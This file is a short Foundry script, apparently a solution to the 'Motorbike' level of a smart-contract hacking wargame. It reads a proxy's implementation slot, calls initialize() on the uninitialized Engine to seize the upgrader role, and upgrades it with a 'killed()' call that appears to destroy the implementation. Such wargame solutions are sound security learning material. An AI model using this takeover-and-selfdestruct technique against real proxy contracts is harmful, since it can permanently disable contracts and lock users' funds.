// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel25.sol";

contract POC is Script {

     Motorbike level25 = Motorbike(0x4B777D17a8B2B8510dD37a433A977C2fD5FC93b6);
     Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
    function run() external{
        vm.startBroadcast();
    
        engineAddress.initialize();
        console.log("Upgrader is :", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(0x19d094D6389c30F7341644Ca6473830c4F416Dd3, encodedData);
        
        vm.stopBroadcast();
    }
}